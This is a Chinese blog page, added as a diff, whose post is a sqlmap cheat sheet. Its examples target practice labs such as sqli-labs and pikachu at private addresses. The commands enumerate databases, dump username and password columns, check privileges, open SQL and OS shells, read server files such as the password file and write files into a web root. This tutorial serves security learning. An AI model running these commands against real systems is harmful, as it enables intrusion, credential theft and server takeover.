@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="明 尘">
+    
+    
+    
+    
+    
+    
+    <title>sqlmap | 文心雕龙</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg,preview6.jpg,preview7.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">文心雕龙</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/php/">php</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/categories">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Linux/">Linux</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">DNS域名解析</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">文心雕龙</a>
+        >
+        <span>sqlmap</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2024/01/01/sqlmap/">sqlmap</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2024-01-01
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2024/01/01/sqlmap/">sqlmap</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2024-01-01
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="Sqlmap使用（必备命令）"><a href="#Sqlmap使用（必备命令）" class="headerlink" title="Sqlmap使用（必备命令）"></a>Sqlmap使用（必备命令）</h1><h2 id="一、Sqlmap注入篇"><a href="#一、Sqlmap注入篇" class="headerlink" title="一、Sqlmap注入篇"></a>一、Sqlmap注入篇</h2><p>Sqlmap是一个专业的SQL注入工具，用法也很多，具体可以用”sqlmap -hh”查看完整的命令帮助文档，这只是一些最常用的Sqlmap用法。</p>
+<h4 id="1、检查注入点"><a href="#1、检查注入点" class="headerlink" title="1、检查注入点"></a>1、检查注入点</h4><p>【get】  sqlmap -u  “url” </p>
+<p>【post】sqlmap -u “url” –data&#x3D;”参数”</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1">http://192.168.2.64/sqli/Less-1</a>“ –data&#x3D;”id&#x3D;1”</p>
+<h4 id="2、爆所有数据库信息"><a href="#2、爆所有数据库信息" class="headerlink" title="2、爆所有数据库信息"></a>2、爆所有数据库信息</h4><p>  –dbs（爆所有数据库信息）</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –dbs</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102095201893.png" alt="image-20240102095201893"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15/">http://192.168.2.64/sqli/Less-15/</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –dbs</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102195526565.png" alt="image-20240102195526565"></p>
+<p>  –current-db（爆当前数据库信息）</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –current-db</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102102853481.png" alt="image-20240102102853481"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1">http://192.168.2.64/sqli/Less-1</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-db</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102195900440.png" alt="image-20240102195900440"></p>
+<h4 id="3、列出指定数据库所有的表名"><a href="#3、列出指定数据库所有的表名" class="headerlink" title="3、列出指定数据库所有的表名"></a>3、列出指定数据库所有的表名</h4><p>  -D 数据库名  –tables</p>
+<p>  例如：列出数据库名为security的所有数据表</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security –tables</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200041636.png" alt="image-20240102200041636"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security –tables</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200529965.png" alt="image-20240102200529965"></p>
+<h4 id="4、列出指定表名的所有列名"><a href="#4、列出指定表名的所有列名" class="headerlink" title="4、列出指定表名的所有列名"></a>4、列出指定表名的所有列名</h4><p>  –columns 所有列名</p>
+<p>  例如：数据库pikachu中users表所有字段名</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security -T users –columns</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200729513.png" alt="image-20240102200729513"></p>
+<p>因为图一样，后面只列一个图。</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users –columns</p>
+<h4 id="5、dump打印输出表名指定列名字段的值数据"><a href="#5、dump打印输出表名指定列名字段的值数据" class="headerlink" title="5、dump打印输出表名指定列名字段的值数据"></a>5、dump打印输出表名指定列名字段的值数据</h4><p>  -C 指定需要显示数值的字段名，不指定默认显示全部字段</p>
+<p>  例如：数据库pikachu中users表中username,password字段的值</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ -D security -T users -C username,password –dump</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102200855339.png" alt="image-20240102200855339"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users -C username,password –dump</p>
+<h4 id="6、Sqlmap-r-使用"><a href="#6、Sqlmap-r-使用" class="headerlink" title="6、Sqlmap -r 使用"></a>6、Sqlmap -r 使用</h4><p>使用Fiddler或者Burp Suite抓包将get或者post请求保存为.txt文件，然后使用Sqlmap -r “txt文件路径”调用，这样就不用输入参数和cookie了。</p>
+<p>例如：登录成功后修改个人信息POST请求存在sql注入，将该post请求拦截后保存.txt文件，就不需要在Sqlmap中输入参数和cookie。</p>
+<p>20.txt</p>
+<p><strong>GET</strong> &#x2F;sqli&#x2F;Less-20&#x2F;index.php <strong>HTTP&#x2F;1.1</strong></p>
+<p><strong>Host</strong>: 192.168.2.64</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p><strong>Cookie</strong>: <strong>uname</strong>&#x3D;<strong>admin</strong></p>
+<p>Upgrade-In<strong>secure-Requests</strong>: 1</p>
+<p><strong>Cache-Control</strong>: max-age&#x3D;0</p>
+<p><strong>Accept-Encoding</strong>: gzip, deflate</p>
+<p><strong>User-Agent</strong>: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;120.0.0.0 Safari&#x2F;537.36</p>
+<p><strong>Referer</strong>: <a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-20/">http://192.168.2.64/sqli/Less-20/</a></p>
+<p><strong>Accept</strong>: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>将20.txt放到安装sqlmap的PC中。</p>
+<p>如果将20.txt放到sqlmap的安装目录中直接通过：root@kalitian:&#x2F;# sqlmap -r “20.txt”   即可执行注入。</p>
+<p>如果将20.txt放到其它目录例如：</p>
+<p>根目录&#x2F;创建tiansqlmap目录来专门保存sql注入的.txt文件，使用方法-r “路径”</p>
+<p>root@kalitian:&#x2F;# sqlmap -r “&#x2F;tiansqlmap&#x2F;20.txt”　　</p>
+<h4 id="7、Sqlmap-m-“批量扫描-txt”"><a href="#7、Sqlmap-m-“批量扫描-txt”" class="headerlink" title="7、Sqlmap -m  “批量扫描.txt”"></a>7、Sqlmap -m  “批量扫描.txt”</h4><p>批量url.txt放到–&gt;&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt</p>
+<p>root@kalitian:~# sqlmap -m “&#x2F;tiansqlmap&#x2F;sqlmap批量url.txt” –smart –batch –level 5</p>
+<h4 id="8、Sqlmap-其它参数"><a href="#8、Sqlmap-其它参数" class="headerlink" title="8、Sqlmap 其它参数"></a>8、Sqlmap 其它参数</h4><p>–threads 10 &#x2F;&#x2F;sqlmap线程最高设置为10<br>–level 3 &#x2F;&#x2F;sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5<br>–risk 3 &#x2F;&#x2F; 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</p>
+<h2 id="二、Sqlmap用户权限"><a href="#二、Sqlmap用户权限" class="headerlink" title="二、Sqlmap用户权限"></a>二、Sqlmap用户权限</h2><h4 id="1、列出数据库管理系统用户"><a href="#1、列出数据库管理系统用户" class="headerlink" title="1、列出数据库管理系统用户"></a>1、列出数据库管理系统用户</h4><p>  –users  列出数据库系统用户</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –users</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102203706699.png" alt="image-20240102203706699"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –users</p>
+<p>  –current-user 查看当前连接数据库用户</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –current-user</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102203904785.png" alt="image-20240102203904785"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-user</p>
+<h4 id="2、判断当前用户是否是DBA"><a href="#2、判断当前用户是否是DBA" class="headerlink" title="2、判断当前用户是否是DBA"></a>2、判断当前用户是否是DBA</h4><p>  –is-dba 是否是DBA</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –is-dba</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102204032260.png" alt="image-20240102204032260"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit”  –is-dba</p>
+<h4 id="3、查看用户权限"><a href="#3、查看用户权限" class="headerlink" title="3、查看用户权限"></a>3、查看用户权限</h4><p>  –privileges  查看用户权限</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-1/?id=1">http://192.168.2.64/sqli/Less-1/?id=1</a>“ –privileges</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20240102205105524.png" alt="image-20240102205105524"></p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.64/sqli/Less-15">http://192.168.2.64/sqli/Less-15</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit”  –privileges</p>
+<p> –privileges -U 指定用户名查看</p>
+<h2 id="三、Sqlmap文件操作与shell提权篇"><a href="#三、Sqlmap文件操作与shell提权篇" class="headerlink" title="三、Sqlmap文件操作与shell提权篇"></a>三、Sqlmap文件操作与shell提权篇</h2><h4 id="1、sql-shell"><a href="#1、sql-shell" class="headerlink" title="1、sql shell"></a>1、sql shell</h4><p>  –sql-shell  进入sql-shell交互</p>
+<p>  这里通过sqlmap可以直接获取一个sql shell，直接执行sql语句进行交互。</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –sql-shell</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –sql-shell</p>
+<p>  进入sql-shell交互：</p>
+<p>注意：这里由于进入了sql shell可以执行sql语句了，也可以用 load data infile、load_file、into outfile等函数来进行文件读取或写入。</p>
+<h4 id="2、cmd-shell"><a href="#2、cmd-shell" class="headerlink" title="2、cmd shell"></a>2、cmd shell</h4><p>  –os-shell 进入cmd shell交互</p>
+<p>  这里通过sqlmap可以直接获取一个cmd shell，直接执行cmd命令进行交互。</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –os-shell</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –os-shell</p>
+<h4 id="3、读取服务器上指定文件"><a href="#3、读取服务器上指定文件" class="headerlink" title="3、读取服务器上指定文件"></a>3、读取服务器上指定文件</h4><p>  –file-read &#x3D; 需要读取文件路径<br>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –file-read&#x3D;&#x2F;etc&#x2F;password</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –file-read&#x3D;d:&#x2F;text.txt</p>
+<h4 id="4、写入本地文件到服务器上"><a href="#4、写入本地文件到服务器上" class="headerlink" title="4、写入本地文件到服务器上"></a>4、写入本地文件到服务器上</h4><p>  –file-write &#x2F;test&#x2F;test.txt –file-dest 本地文件路径</p>
+<p>【get字符型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_str.php?name=vince</a>“ –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</p>
+<p>【post数字类型】root@kali:&#x2F;# sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php">http://192.168.10.7:85/pikachu-master/vul/sqli/sqli_id.php</a>“ –data&#x3D;”id&#x3D;1” –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            明 尘
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/01/sqlmap/">sqlmap</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/01/waf%E5%92%8CBP/">waf和BP</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/28/T2/">T2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/27/sql%E7%BB%95%E8%BF%87/">T1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/22/python3/">python3</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/13/php%E5%AD%A6%E4%B9%A01/">php学习1</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/02/Linux%E5%91%BD%E4%BB%A4/">Linux命令</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/html%E5%92%8Ccss%E5%AD%A6%E4%B9%A0/">html和css学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/08/vue%E5%AD%A6%E4%B9%A0/">vue学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/01/sqlmap/">sqlmap</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/27/sql%E7%BB%95%E8%BF%87/">T1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/%E6%B8%97%E9%80%8F%E5%92%8C%E9%9D%B6%E6%9C%BA/">渗透和靶机</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2024/01/01/sqlmap/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2024/01/01/sqlmap/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2024/01/01/sqlmap/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Linux/" style="font-size: 11.940978317374645px;" class="tag-cloud-link">Linux</a>
+    
+    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 17.524195604514166px;" class="tag-cloud-link">基础知识</a>
+    
+    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 17.887519465853703px;" class="tag-cloud-link">DNS域名解析</a>
+    
+    <a href="/tags/HTML/" style="font-size: 14.795904925309152px;" class="tag-cloud-link">HTML</a>
+    
+    <a href="/tags/CSS/" style="font-size: 11.563697416751666px;" class="tag-cloud-link">CSS</a>
+    
+    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 15.204396635129392px;" class="tag-cloud-link">学习</a>
+    
+    <a href="/tags/PHP/" style="font-size: 16.3878418017926px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/Navicat/" style="font-size: 19.416275282215377px;" class="tag-cloud-link">Navicat</a>
+    
